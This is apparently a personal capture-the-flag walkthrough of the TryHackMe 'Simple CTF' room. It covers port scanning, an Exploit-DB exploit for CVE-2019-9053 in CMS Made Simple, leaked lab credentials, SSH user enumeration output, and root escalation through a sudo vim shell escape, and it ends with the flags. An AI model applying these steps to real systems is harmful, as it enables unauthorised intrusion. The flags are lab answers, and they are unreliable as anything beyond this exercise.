Try Hack Me - Simple CTF

https://tryhackme.com/room/easyctf

21 ftp<br>
vsftpd 3.0.3
Anonymous allowed
Clue: mitch is a developer with a terrible password
Also the system user has the same password


80 http<br>
Apache httpd 2.4.18 (Ubuntu)
Apache default server page

dirb http://10.10.74.146


/simple
CMS made simple 2.2.8 
CVE-2019-9053 <----
Kör exploit från exploit-DB
User: mitch
Pwd: secret

2222 EtherNetIP-1 ???<br>
OpenSSH 7.2p Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

CVE-2016-3115
CVE-2016-6210
CVE-2016-6515

User enumeration:
10.10.45.7:2222 - SSH - User 'root' found
[+] 10.10.45.7:2222 - SSH - User 'admin' found
[+] 10.10.45.7:2222 - SSH - User 'test' found
[+] 10.10.45.7:2222 - SSH - User 'guest' found
[+] 10.10.45.7:2222 - SSH - User 'info' found
[+] 10.10.45.7:2222 - SSH - User 'adm' found
[+] 10.10.45.7:2222 - SSH - User 'mysql' found
[+] 10.10.45.7:2222 - SSH - User 'user' found
[+] 10.10.45.7:2222 - SSH - User 'administrator' found
[+] 10.10.45.7:2222 - SSH - User 'oracle' found
[+] 10.10.45.7:2222 - SSH - User 'ftp' found
[+] 10.10.45.7:2222 - SSH - User 'pi' found
[+] 10.10.45.7:2222 - W3ll DdSSH - User 'puppet' found
[+] 10.10.45.7:2222 - SSH - User 'ansible' found
[+] 10.10.45.7:2222 - SSH - User 'ec2-user' found
[+] 10.10.45.7:2222 - SSH - User 'vagrant' found
[+] 10.10.45.7:2222 - SSH - User 'azureuser' found
side traCK...


SSH -P 2222 mitch@10.10.74.146
Pwd: secret

user.txt
G00d j0b!

Escalation

sudo -l -l
/usr/bin/vim

:!bash

ls /home
sunbath

ls /root
cat /root/root.txt
W3ll d0n3. You made it!
